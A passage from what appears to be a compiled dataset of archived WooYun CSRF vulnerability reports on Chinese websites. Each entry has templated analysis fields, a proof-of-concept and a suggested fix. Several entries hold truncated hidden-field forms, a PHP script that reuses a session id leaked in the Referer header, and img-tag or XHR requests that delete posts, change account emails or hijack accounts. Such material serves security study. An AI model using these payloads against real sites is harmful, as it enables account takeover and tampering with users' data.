**详情**: https://example.com/[已脱敏] 未加tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><input type="hidden" name="receiverAdd&#46;detailAddress" value="wooyunwooyun" /><input type="hidden"

**POC**: https://example.com/[已脱敏] 未加tokenPOC<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="receiverAdd&#46;receiverName" value="wooyun" /><input type="hidden" name="receiverAdd&#46;mobile" value="13838383838" /><

**绕过**: 直接利用

**修复**: 加token  加referer check
---

---
### [wooyun-2015-0129208] 豆丁网某处漏洞可用来重置用户密码
**厂商**: 豆丁网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="question" value="1" /><input type="hidden" name="answer" value="hackimg" /><input type="

**绕过**: 直接利用

**修复**: 加上一些验证吧。
---

---
### [wooyun-2012-05815] TOM邮箱CSRF漏洞
**厂商**: TOM在线 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 对于包含图片的附件，请求附件时Referer中会暴露当前sid，例如：GET /mblogpic/be654a34c8f4aad1ec6a/2000 HTTP/1.1Host: t100.qpic.cnConnection: keep-aliveCache-Control: max-age=0If-Modified-Since: Fri, 06 Apr 2012 14:00:09 GMTUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19Accept: */*Referer: https://example.com/[已脱敏]

**POC**: 测试代码：<?php$url = parse_url($_SERVER['HTTP_REFERER']);$host = $url['host'];parse_str($url['query']);$loc = "http://$host/cgi/ldapapp?sid=$sid&tempname=options%2Frefuselist.htm&funcid=opuserattr&optype=set&refuselist=test%40test.com&update.x=1";header("Location: $loc");?>

**绕过**: 直接利用

**修复**: 在URL中隐藏sid属性，限制GET操作
---

---
### [wooyun-2014-076803] 某互金平台CSRF一枚
**厂商**: 上海拍拍贷金融信息服务有限公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: CSRF的FORM，登录后直接访问：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="QuestionId1" value="1" /><input type="hidden" name="Answer1" value="a1" /><input type="hidden" name="QuestionId2" value="2" /><input type="hidden" name="Answer2" value="a2" /><input type="hidden" name="QuestionId3" value="3" /><input type="hidden" name="Answer3" value=

**POC**: 使用新登录的安全问题，通过了验证。证明有登录成功。POST /userbind/answersafequestion HTTP/1.1Host: ac.ppdai.comProxy-Connection: keep-aliveContent-Length: 74Accept: */*Origin: https://example.com/[已脱敏] XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.

**绕过**: 直接利用

**修复**: DB登录时加token
---

---
### [wooyun-2015-0163667] 糗事百科存CSRF漏洞
**厂商**: 糗事百科 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录糗事百科，可以查看已发表的糗事和评论，如下图：创建一个html文件如图：该文件使用了一个<img>标签，其中的地址指向删除糗事百科文章的链接。攻击者如果诱使用户访问这个页面，图片会显示加载失败，如下图：用户不会感到异常，但是查看糗事百科个人中心时，发现已发表的糗事被删除了，如下图：

**POC**: 见详细说明。

**绕过**: 直接利用

**修复**: 在敏感操作时要求输入验证码，或进行Referer Check，或者使用Anti SCRF Token.
---

---
### [wooyun-2015-0144015] PPTV(PPlive)某处功能设计缺陷导致跨站请求伪造(CSRF)
**厂商**: PPTV(PPlive) | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2014-057977] 知乎某处csrf可删除有用信息
**厂商**: 知乎 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 有个清空草稿看到没，没有tokenhttps://example.com/[已脱敏]

**POC**: 我的草稿呢

**绕过**: 直接利用

**修复**: 其他地方csrf防得挺好的
---

---
### [wooyun-2014-085749] 看我如何使用CRSF为自己狂点赞
**厂商**: 咕咚网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 结合上次漏洞的各种crsf，我们可以达到很多目的这里以点赞为例点赞地址为：https://example.com/[已脱敏]

**POC**: 某一时间段的点赞记录上图就可以证明可以大面积让别人帮我们点赞现在刚好有个活动，为自己集100赞，可以兑换咕咚手环2一个，不知道能否兑换一个，哈哈哈！

**绕过**: 直接利用

**修复**: 修复CRSF 图像验证
---

---
### [wooyun-2014-054785] 人人网-某搜索引擎OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 人人网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 人人-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 参数 来抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个人人-某搜索引擎OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036152] 散文吧退出逻辑错误csrf
**厂商**: sanwen8.cn | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 站长登录后可以点击一下：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 修复！ 为了防止被恶意利用。把此url给改掉，不要给任意用户退出
---

---
### [wooyun-2014-054894] 太平洋亲子网-某互联网公司 OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 太平洋亲子网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平洋亲子网-某互联网公司 OAuth 2.0 认证流程中https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议厂商采取有效的方式来抵抗针对 OAuth 2.0 redirect_uir 的CSRF 攻击。比如：1. 在将用户账号绑定至第三方账号之前，强制用户重新输入帐号密码。缺点： 会牺牲用户体验。 因为大多数用户在登录了以后，是不想再输入密码的。2. 通过验证 referer的值来抵抗CSRF 攻击，
---

---
### [wooyun-2013-025888] 某社交网站CSRF，可发某社交平台，某互联网公司，某门户网站，某社交平台
**厂商**: 某社交网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 评论处未做token验证或者referer验证，可直接CSRF，也可以使用户强制选择同步到某社交平台。

**POC**: function publish(){url='https://example.com/[已脱敏]';data='sync=true';post(url,data,true);url = 'https://example.com/[已脱敏]';data = 'id=MAC5TbSP&c=1234555';post(url,data,true);}其中第一个请求是让用户选择"同步到某社交平台"，第二个请求中id参数是表明哪一篇文章，第二个参数是评论内容，无任何验证

**绕过**: 直接利用

**修复**: 验证Token，验证来源
---

---
### [wooyun-2015-0164890] 爱旅行网csrf删除收货地址
**厂商**: 爱旅行网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在测试网站时发现删除收获地址时,只采用ID进行认证，也就是说只要知道对方的地址ID，便可构造poc进行CSRF，于是注册了两个号来测试：帐号1：帐号2：构造url:https://example.com/[已脱敏] src="https://example.com/[已脱敏]"></html>

**POC**: (见原文)

**绕过**: 直接利用

**修复**: token认证
---

---
### [wooyun-2015-0128626] p2p金融安全之前海理想金融多处CSRF漏洞
**厂商**: id68.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="cell&#95;phone" value="13333333331" /><input type="hidden" name="info" value="222" /><input type="hidden" name="age" value="0" /><input type="hidden" name="province" value="0" /><input type="hidden" name="area" value="�#175;&#183;�#128;&#137;�#1

**POC**: 单位资料<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="department&#95;name" value="1111111111111111111" /><input type="hidden" name="department&#95;address" value="1111111111111111111" /><input type="hidden" name="&#95;tps" value=

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2014-075461] 某社交平台某社交平台某分站csrf发私信并可以无限发送私信
**厂商**: 某社交平台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 某社交平台人脉处抓包 木有token啊

**POC**: 经过测试发现 验证了Referer头Referer 为*。weibo.com而且还可以get  发送  于是构造urlhttps://example.com/[已脱敏] 。。。可以发给任意某社交平台用户2：私信炸弹发私信抓包 直接到intruder  1000条很快跑完！！1000多条。。

**绕过**: 直接利用

**修复**: 限次私信发送次数 验证Referer头  不是好友不能发私信
---

---
### [wooyun-2015-0106224] 宜人贷CSRF漏洞一枚
**厂商**: 宜人贷 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册账号后 需要验证身份证和姓名没有token验证 可CSRF修改用户名的地方也未加token

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加上token验证
---

---
### [wooyun-2015-0127229] 名品导购网csrf漏洞
**厂商**: 名品导购网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 名品导购网多处存在csrf漏洞，这边以修改收货地址为例。修改收货地址，抓包：修改成功:无不可预测参数，构造链接xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("__VIEWSTATE=&ctl00%24ctl00%24ContentBody%24ContentRight%24hcity=110000&ctl00%24ctl00%24ContentBody%24ContentRight%24harea=110101&ctl00%24ctl0

**POC**: 多处存在类似漏洞，望厂商逐一修改求礼物。。

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2014-060609] Easytalk 最新版两处CSRF
**厂商**: nextsns.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本地建立三个号test1，test2，test3test3为被攻击者的帐号0x1 添加收听处存在CSRF，可以刷粉丝，看证明登陆test2，收听test1，发现链接是这样的http://localhost/easytalk/?m=friends&a=addfollow&user_id=11&rand=2105很明显user_id是test1的id，后面有随机数rand，不过后面证明是无用的用test2发布一条信息，包含上面的链接登陆屌丝帐号test3，在广场看到此等内容必然点一下结果是这样的再然后就发现直接收听了

**POC**: 0x2 取消收听处存在CSRF，看哪个号不爽就。。。看证明登陆test2，发现取消收听test2的链接是这样的http://localhost/easytalk/?m=friends&a=delfollow&user_id=11&rand=192192同理，rand是没用的以这个链接来发布信息登陆test3，可以看到，点击

**绕过**: 直接利用

**修复**: 检查来源PS：吐槽一下，为啥本地测试，因为官网老是注册失败，激活的时候显示姓名不正确，无解了
---

---
### [wooyun-2013-041011] 面包旅行网几处CSRF
**厂商**: 面包旅行 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 删除旅程处可以csrf，GET方式poc：<img src=https://example.com/[已脱敏] 收藏的功能存在CSRF。poc:https://example.com/[已脱敏] 退出的功能存在CSRFpoc：https://example.com/[已脱敏]

**POC**: 自己发布一个旅程测试：访问poc页面：刷新主页，旅程被删除了。

**绕过**: 直接利用

**修复**: 参考wooyun知识库：https://example.com/[已脱敏]
---

---
### [wooyun-2012-09949] 某社交平台某社交平台加关注CSRF漏洞（已经泛滥）
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在某社交平台上有人发灵异视频链接让人点击，原始短URL：https://example.com/[已脱敏]

**POC**: 漏洞接口：https://example.com/[已脱敏]]&source=3818214747&_cache_time=0&method=post

**绕过**: 直接利用

**修复**: 某社交平台懂得。
---

---
### [wooyun-2014-087241] 某外卖平台网CSRF可以删除其他用户站内消息
**厂商**: 某外卖平台网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 删除站内消息的post请求没有token,可以进行CSRF来删除他人消息。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2015-0113536] Newifi y1路由器后台登录绕过后可执行任意系统命令与CSRF风险等
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 命令执行：http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2013-018470] 某社交平台自动加粉丝漏洞
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 案例:https://example.com/[已脱敏]

**POC**: 案例:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 。
---

---
### [wooyun-2014-055510] 人人网之人人乐惠csrf #1
**厂商**: 人人网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：https://example.com/[已脱敏]"result":true,"retCode":0}翻译后就是：{“结果”：真实的，“RETCODE”：0}非常的beautiful ，

**POC**: 让我们看看保存参数recvProvince=åäº¬&recvCity=åäº¬&recvArea=æµ·æ·åº&recvAddr=test&recvName=test&recvPostalCode=123456&recvMobile=13800138000收货人姓名省recvCity市recvArea 区recvAddrrecvName 收货人姓名recvPostalCode 邮编recvMobile 手机号码这个也可以构造一个poc删除抓包得到：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2012-08065] 某互联网公司公益某活动可以修改别人任意个性签名
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 在某社交空间发布效果最好，直接打开就成功了。

**绕过**: 直接利用

**修复**: 加判断或尽量用POST
---

---
### [wooyun-2013-026062] 壹心理多处CSRF
**厂商**: xinli001.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 评论区只做了前端的htmlencode。。。直接用fiddler截包，修改内容，再replay就行了

**POC**: 然后随便就可以拿一堆cookie，不少还是核心用户的。值得注意的是：1.这个网站所有的几乎评论区都有这个问题，一些热门的帖子只要挂了这个所有看帖的人都中招。。2.网站的cookie中的sessionid被标记为httpOnly了，没法利用cookie登录他人的账户。但是搞个欺骗登录或者挂广告什么的都还是可以的。3.后端过滤很重要！这里用<script>测试都过了,可以想象利用iframe,style expression/javascript, onload事件等等跨站方法应该都可行。4.这个网站提供的FM真的很不错。

**绕过**: 直接利用

**修复**: 注意后台过滤！
---

---
### [wooyun-2013-038410] shopnc最新版一处csrf可刷关注
**厂商**: ShopNC | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点击关注，抓包，为get类型，变量为被关注的id。测试地址，官方测试网站：https://example.com/[已脱敏]

**POC**: 。

**绕过**: 直接利用

**修复**: 1 get变post。2 加token。3 验证refer
---

---
### [wooyun-2015-0129738] 华润E万家任意收获地址更改(CSRF漏洞)
**厂商**: 华润E万家 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先两个账户：testqianxiaotestqianxiao2首先我们登陆第一个账户，发现有个收获地址，我们抓包看看看竟然没有token，也没有验证OK 我们构造POC，看截图好的，POC已经构造好了！我们来登录帐号2我们来访问POC 看截图再看收货地址的地方

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 验证token
---

---
### [wooyun-2015-0135616] 蜘蛛网某处csrf可修改用户个人信息
**厂商**: spider.com.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改个人信息处未加token验证 未验证refer<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="usertype" value="first002" /><input type="hidden" name="useralise" value="wooyuntest" /><input type="hidden" name="sex" value="m" /><input type="hidden" name="year&#95;sld" value="2015" /><input type="hidden" name="month&#95;sld" value="01" /><input type="hidde

**POC**: poc地址：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: poc地址：https://example.com/[已脱敏]
---

---
### [wooyun-2013-017271] 我是如何刷某社交平台某社交平台粉丝的
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.首先声明下哈：我只是简单测试给自己刷了一些粉丝，没有继续了；确实可以搞CSRF蠕虫的，我木搞啊！我是好娃子！2.开始吧，出问题的站点是：tw.weibo.com这个站点对CSRF不设防，加关注、取消关注、发某社交平台、留言不设置任何防范。我下面举两个例子：3.加关注的接口是：https://example.com/[已脱敏]

**POC**: 6.好的，刷粉丝的问题说完了！下面是可能引发蠕虫的地方，发某社交平台（我没有测试哈哈），我看了留言的地方，没有防范CSRF，恐怖的是居然也是个GET请求方式！请看下面请求：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 希望厂商的回复不是：多谢提供，此问题已经内部发现并通知了相关负责人进行修复。
---

---
### [wooyun-2013-032522] Tom某处高危Get型Csrf可直接导致用户帐户被劫持
**厂商**: TOM在线 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 添加备用邮箱处无token表单使用的是POST，但是尝试了一下，GET也能成功啊！！！！！！危害瞬间提高了一个等级啊！！！！！！所以，POC如下：<img src=https://example.com/[已脱敏] />欺骗用户访问含有这段代码的页面后，就会自动增加一个备用邮箱，就可以找回密码了。下面是图，就不解释了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 把$REQUEST['action']和$REQUEST['email2']改成$_POST,并加上高强度随机token求20rank 求礼物
---

---
### [wooyun-2014-054897] 太平洋家居网-某社交平台 OAuth 2.0 redirect_uir CSRF 漏洞
**厂商**: 太平洋家居网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 太平洋家居网-某社交平台 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议厂商采取有效的方式来抵抗针对 OAuth 2.0 redirect_uir 的CSRF 攻击。比如：1. 在将用户账号绑定至第三方账号之前，强制用户重新输入帐号密码。缺点： 会牺牲用户体验。 因为大多数用户在登录了以后，是不想再输入密码的。2. 通过验证 referer的值来抵抗CSRF 攻击，
---

---
### [wooyun-2015-0154819] 药房网某处存在CSRF
**厂商**: yaofang.cn | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 药房网某处存在CSRF可添加收获地址添加收获地址post包中未加token 也未进行referer check 导致csrfcsrf poc<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="consignee" value="xijinping" /><input type="hidden" name="mobile" value="13888888888" /><input type="hidden" name="address" value="xijinping" /><input type="hidden" name="province" value="40002" /><input type="hidden" name="ci

**POC**: WooYun: 药房网某处存在csrf可修改用户信息上一个漏洞说 给礼物 几个月过去了 屁都没有  忽悠我呢？

**绕过**: 直接利用

**修复**: WooYun: 药房网某处存在csrf可修改用户信息上一个漏洞说 给礼物 几个月过去了 屁都没有  忽悠我呢？
---

---
### [wooyun-2015-0132709] 多玩歪歪某处任意更改他人资料（CSRF）
**厂商**: 广州多玩 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们截包看看没有验证token  我们换个帐号看看构造poc我们访问下出现个下载，没事我们下载或者取消都可以。已经更改成功了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加token
---

---
### [wooyun-2015-0162483] 点我的链接我就可能会进入你的csdn账号
**厂商**: CSDN开发者社区 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: csdn的绑定某社交平台登陆的请求为https://example.com/[已脱敏]

**POC**: 已录视频https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
---

---
### [wooyun-2010-0780] 某互联网公司某社交空间CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试前：诱使用户访问页面后(允许访问人增加，密码修改)：

**POC**: CSRF FORM示例代码：<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="seq" value="335" /><input type="hidden" name="uinlist" value="***" /><!--允许查看用户的列表--><input type="hidden" name="entryq1" value="you know?" /><!--问题1--><input type="hidden" nam

**绕过**: 直接利用

**修复**: 增加验证机制，或更改设置时输入密码等...
---

---
### [wooyun-2015-0124165] 六房间可劫持任意帐号进行任意操作
**厂商**: 六间房 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] domain="*"/></cross-domain-policy>6房间flash配置文件为*，导致其他域可发送任意请求eg获取聊天记录：https://example.com/[已脱敏]  //劫持获取这个页面得到tuid=53646313（聊天ID，如果有多个则获取多个）https://example.com/[已脱敏]  //继续劫持获取与用户的聊天记录POC：https://example.com/[已脱敏]

**POC**: 如上。

**绕过**: 直接利用

**修复**: 1.crossdomain配置信任域2.敏感操作验证token
---

---
### [wooyun-2015-0129766] 华润E万家任意密码重置漏洞(CSRF)
**厂商**: 华润E万家 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看到个修改邮箱的功能，我们继续抓包看看！看了数据包 果断构造POC我们访问poc看已经成功了

**POC**: 然后就可以利用邮箱忘记密码了

**绕过**: 直接利用

**修复**: 验证token
---

---
### [wooyun-2015-0125481] 某视频网站网配置不当可劫持用户查看观影记录
**厂商**: 某视频网站网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 此类问题可查看文章进行详细测试步骤：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-055462] 音悦台-某搜索引擎 OAuth 2.0 redirect_uri CSRF 漏洞
**厂商**: 音悦台 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 音悦台-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个音悦台-某搜索引擎  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0100676] 爱卡汽车网CSRF一枚
**厂商**: 爱卡汽车网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在这里https://example.com/[已脱敏] method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="type" value=""/><input type="hidden" name="id" value=""/><input type="hidden" name="uname" value="22222"/><input type="hidden" name="sheng_id" value="1"/><input type="hidden" name

**POC**: (见原文)

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2016-0213414] 沪江网多处CSRF可编辑用户个人信息&编辑/修改用户收获地址
**厂商**: hujiang.com | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 个人信息编辑处收获地址添加处

**POC**: 个人信息编辑处收获地址添加处

**绕过**: 直接利用

**修复**: 加入CSRF token验证Referer小礼物
---

---
### [wooyun-2015-0128904] 时光网某处功能设计缺陷导致跨站请求伪造(CSRF)#1
**厂商**: 时光网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
